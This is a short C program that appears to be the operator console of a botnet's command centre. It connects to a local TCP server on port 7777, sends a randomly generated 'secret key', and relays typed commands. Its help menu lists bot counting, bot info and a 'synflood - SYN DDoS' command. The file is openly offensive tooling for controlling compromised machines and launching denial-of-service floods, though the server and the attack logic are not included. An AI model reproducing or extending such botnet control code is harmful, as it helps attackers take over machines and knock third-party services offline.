#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h> 
#include <time.h>

void error(const char *msg)
{
    perror(msg);
    exit(0);
}

int main(int argc, char *argv[])
{
	srand(time(NULL));
    int sockfd, n;
    static int portno;
    struct sockaddr_in serv_addr;
    struct hostent *server;

    char buffer[256];
    portno = 7777;
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0) 
		error("ERROR opening socket");
	server = gethostbyname("127.0.0.1");
	if (server == NULL) {
		fprintf(stderr,"ERROR, no such host\n");
		exit(0);
	}
	bzero((char *) &serv_addr, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	bcopy((char *)server->h_addr, 
		(char *)&serv_addr.sin_addr.s_addr,
		server->h_length);
	serv_addr.sin_port = htons(portno);
	if (connect(sockfd,(struct sockaddr *) &serv_addr,sizeof(serv_addr)) < 0) 
		error("ERROR connecting");
	char secretkey[87];
	for (int i = 0; i < 87; i++) {
		secretkey[i] = rand() % 9 + 1;
	}
	n = write(sockfd, secretkey, sizeof(secretkey));
	printf("You have successfully connected to the command center!\n");
	printf("To exit enter a command: exit\n");
	printf("To help enter a command: infocommands\n");
	while(1){
		printf("Please enter a command: ");
		bzero(buffer,256);
		fgets(buffer,255,stdin);
		/*if (strlen(buffer) == 5) {
			exit(0);
		}*/
		if (strlen(buffer) == 13) {
			printf("Welcome to botnet! Info about commands:\n");
			printf("clients - how many bots connected\n");
			printf("infocommands - show this help\n");
			printf("info - show info about bot\n");
			printf("synflood - SYN DDoS\n");
			continue;
		}
		n = write(sockfd, buffer, strlen(buffer));
		if (n < 0) 
			error("ERROR writing to socket");
		bzero(buffer,256);
		n = read(sockfd,buffer,255);
		if (n < 0) 
			error("ERROR reading from socket");
		printf("%s\n",buffer);
	}
	close(sockfd);
	
    return 0;
}
